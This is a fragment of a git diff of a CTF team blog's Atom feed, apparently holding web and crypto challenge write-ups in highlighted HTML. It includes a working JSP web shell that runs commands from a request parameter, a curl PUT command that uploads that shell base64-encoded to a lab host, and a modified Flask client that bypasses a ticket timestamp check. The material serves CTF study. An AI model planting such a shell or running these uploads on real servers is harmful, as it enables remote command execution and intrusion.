class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"023"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream <span class="keyword">in</span> = Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        <span class="keyword">out</span>.print(<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=<span class="keyword">in</span>.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">out</span>.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">out</span>.print(<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">2.13</span>:<span class="number">8080</span><span class="regexp">/2.jsp/</span> -d <span class="string">"`echo PCUKICAgIGlmKCIwMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiaSIpKS5nZXRJbnB1dFN0cmVhbSgpOwogICAgICAgIGludCBhID0gLTE7CiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsyMDQ4XTsKICAgICAgICBvdXQucHJpbnQoIjxwcmU+Iik7CiAgICAgICAgd2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXsKICAgICAgICAgICAgb3V0LnByaW50bG4obmV3IFN0cmluZyhiKSk7CiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9CiU+|base64 -d`"</span></span><br></pre></td></tr></table></figure>]]></content>
     
     <summary type="html">
     
-      &lt;h1 id=&quot;first&quot;&gt;&lt;a href=&quot;#first&quot; class=&quot;headerlink&quot; title=&quot;first&quot;&gt;&lt;/a&gt;first&lt;/h1&gt;&lt;p&gt;从&lt;a href=&quot;http://www.zip获取源码&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.zip获取源码&lt;/a&gt;&lt;/p&gt;
+      first
+从www.zip获取源码
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+
+
+session_start();
+   error_reporting(0);
+   include &quot;user.php&quot;;
+   include &quot;conn.php&quot;;
+   $IV = &quot;85196940&quot;;// you cant know that;
+   if(!isset($_COOKIE[&#39;user&#39;]) || !isset($_COOKIE[&#39;hash&#39;])){
+    
     
     </summary>
     
@@ -478,8 +984,40 @@ v1 += 3;
     
     <summary type="html">
     
-      &lt;p&gt;题目很简单，逻辑捋清楚就行了，从client出发，先后向kdc的getTGT和getTicket发包校验，校验通过则发包到cmd执行，执行没有回显，主要在getTicket中的判断限制了cmd的内容，不过认真分析一下kdc源码，可以发现data变量是可控的，控制前一数据包中的timestamp使得int(time.time()) - data[‘timestamp’] &amp;gt; 60就可以了，所以修改client app.py&lt;/p&gt;
-&lt;figure class=&quot;highlight kotlin&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from flask &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Flask, request, render_template, redirect, url_for, session, flash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;from flask_bootstrap &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; Bootstrap&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;from form &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; RegisterForm, CmdForm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;from toolkit &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; AESCipher&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; os, requests, json, time, base64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;app = Flask(__name__)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;app.config[&lt;span class=&quot;string&quot;&gt;&quot;SECRET_KEY&quot;&lt;/span&gt;] = os.urandom(&lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bootstrap = Bootstrap(app)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;@app&lt;/span&gt;.route(&lt;span class=&quot;string&quot;&gt;&#39;/&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def index():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; render_template(&lt;span class=&quot;string&quot;&gt;&#39;index.html&#39;&lt;/span&gt;, form=&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;@app&lt;/span&gt;.route(&lt;span class=&quot;string&quot;&gt;&#39;/cmd&#39;&lt;/span&gt;, methods=[&lt;span class=&quot;string&quot;&gt;&#39;GET&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;POST&#39;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def cmd():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    form = CmdForm()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; request.method == &lt;span class=&quot;string&quot;&gt;&#39;GET&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; render_template(&lt;span class=&quot;string&quot;&gt;&#39;index.html&#39;&lt;/span&gt;, form=form)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    elif request.method == &lt;span class=&quot;string&quot;&gt;&#39;POST&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; form.validate_on_submit():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            username = form.username.&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            master_key = form.master_key.&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            cmd = form.cmd.&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            print(username,master_key,cmd)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            cryptor = AESCipher(master_key)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            authenticator = cryptor.encrypt(json.dumps(&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;:username, &lt;span class=&quot;string&quot;&gt;&#39;timestamp&#39;&lt;/span&gt;: int(time.time())&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            res = requests.post(&lt;span class=&quot;string&quot;&gt;&#39;http://121.37.164.32:5001/getTGT&#39;&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;=&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;: username, &lt;span class=&quot;string&quot;&gt;&#39;authenticator&#39;&lt;/span&gt;: base64.b64encode(authenticator)&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; res.content == &lt;span class=&quot;string&quot;&gt;&#39;time error&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flash(&lt;span class=&quot;string&quot;&gt;&#39;time error&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;index&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; res.content.startswith(&lt;span class=&quot;string&quot;&gt;&#39;auth&#39;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flash(&lt;span class=&quot;string&quot;&gt;&#39;auth error&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;index&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            session[&lt;span class=&quot;string&quot;&gt;&#39;session_key&#39;&lt;/span&gt;], session[&lt;span class=&quot;string&quot;&gt;&#39;TGT&#39;&lt;/span&gt;] = cryptor.decrypt(base64.b64decode(res.content.split(&lt;span class=&quot;string&quot;&gt;&#39;|&#39;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;])), res.content.split(&lt;span class=&quot;string&quot;&gt;&#39;|&#39;&lt;/span&gt;)[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            flash(&lt;span class=&quot;string&quot;&gt;&#39;GET TGT DONE&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            #visit TGS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            cryptor = AESCipher(session[&lt;span class=&quot;string&quot;&gt;&#39;session_key&#39;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            authenticator = cryptor.encrypt(json.dumps(&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;: username, &lt;span class=&quot;string&quot;&gt;&#39;timestamp&#39;&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            res = requests.post(&lt;span class=&quot;string&quot;&gt;&#39;http://121.37.164.32:5001/getTicket&#39;&lt;/span&gt;,  &lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;=&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;: username, &lt;span class=&quot;string&quot;&gt;&#39;cmd&#39;&lt;/span&gt;: cmd, &lt;span class=&quot;string&quot;&gt;&#39;authenticator&#39;&lt;/span&gt;: base64.b64encode(authenticator), &lt;span class=&quot;string&quot;&gt;&#39;TGT&#39;&lt;/span&gt;: session[&lt;span class=&quot;string&quot;&gt;&#39;TGT&#39;&lt;/span&gt;]&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; res.content == &lt;span class=&quot;string&quot;&gt;&#39;time error&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flash(&lt;span class=&quot;string&quot;&gt;&#39;time error&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;index&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; res.content.startswith(&lt;span class=&quot;string&quot;&gt;&#39;auth&#39;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flash(&lt;span class=&quot;string&quot;&gt;&#39;auth error&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;index&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; res.content == &lt;span class=&quot;string&quot;&gt;&#39;cmd error&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flash(&lt;span class=&quot;string&quot;&gt;&#39;cmd not allow&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;index&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            flash(&lt;span class=&quot;string&quot;&gt;&#39;GET Ticket DONE&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            client_message, server_message = res.content.split(&lt;span class=&quot;string&quot;&gt;&#39;|&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            session_key = cryptor.decrypt(base64.b64decode(client_message))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            cryptor = AESCipher(session_key)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            authenticator = base64.b64encode(cryptor.encrypt(username))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            res = requests.post(&lt;span class=&quot;string&quot;&gt;&#39;http://121.37.164.32:5002/cmd&#39;&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;=&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;server_message&#39;&lt;/span&gt;: server_message, &lt;span class=&quot;string&quot;&gt;&#39;authenticator&#39;&lt;/span&gt;: authenticator&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; render_template(&lt;span class=&quot;string&quot;&gt;&#39;index.html&#39;&lt;/span&gt;, form=&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, flag=res.content)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; render_template(&lt;span class=&quot;string&quot;&gt;&#39;index.html&#39;&lt;/span&gt;, form=form)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;error&#39;&lt;/span&gt; , &lt;span class=&quot;number&quot;&gt;500&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;@app&lt;/span&gt;.route(&lt;span class=&quot;string&quot;&gt;&#39;/register&#39;&lt;/span&gt;, methods=[&lt;span class=&quot;string&quot;&gt;&#39;GET&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;POST&#39;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def register():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    form = RegisterForm()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; request.method == &lt;span class=&quot;string&quot;&gt;&#39;GET&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; render_template(&lt;span class=&quot;string&quot;&gt;&#39;index.html&#39;&lt;/span&gt;, form=form)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    elif request.method == &lt;span class=&quot;string&quot;&gt;&#39;POST&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; form.validate_on_submit():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            username = form.username.&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            master_key = form.master_key.&lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            res = requests.post(&lt;span class=&quot;string&quot;&gt;&#39;http://121.37.164.32:5001/register&#39;&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;data&lt;/span&gt;=&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;username&#39;&lt;/span&gt;: username, &lt;span class=&quot;string&quot;&gt;&#39;master_key&#39;&lt;/span&gt;: master_key&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; res.content == &lt;span class=&quot;string&quot;&gt;&#39;duplicate username&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;register&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            elif res.content != &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt; :&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                session[&lt;span class=&quot;string&quot;&gt;&#39;id&#39;&lt;/span&gt;] = int(res.content)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flash(&lt;span class=&quot;string&quot;&gt;&#39;register success&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&quot;string&quot;&gt;&#39;index&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; render_template(&lt;span class=&quot;string&quot;&gt;&#39;index.html&#39;&lt;/span&gt;, form=form)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;error&#39;&lt;/span&gt; , &lt;span class=&quot;number&quot;&gt;500&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; __name__ == &lt;span class=&quot;string&quot;&gt;&#39;__main__&#39;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    app.run(host=&lt;span class=&quot;string&quot;&gt;&#39;0.0.0.0&#39;&lt;/span&gt;, debug=False, port = &lt;span class=&quot;number&quot;&gt;5000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+      题目很简单，逻辑捋清楚就行了，从client出发，先后向kdc的getTGT和getTicket发包校验，校验通过则发包到cmd执行，执行没有回显，主要在getTicket中的判断限制了cmd的内容，不过认真分析一下kdc源码，可以发现data变量是可控的，控制前一数据包中的timestamp使得int(time.time()) - data[‘timestamp’] &gt; 60就可以了，所以修改client app.py
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
     
     </summary>
     
@@ -496,22 +1034,41 @@ v1 += 3;
   </entry>
   
   <entry>
-    <title>V&amp;N招新赛web部分题解</title>
-    <link href="https://boiteam.github.io/2020/02/29/V/"/>
-    <id>https://boiteam.github.io/2020/02/29/V/</id>
-    <published>2020-02-29T10:33:07.000Z</published>
-    <updated>2020-03-01T06:24:02.891Z</updated>
+    <title>2020 GXZYCTF lancet</title>
+    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_crypto-lancet/"/>
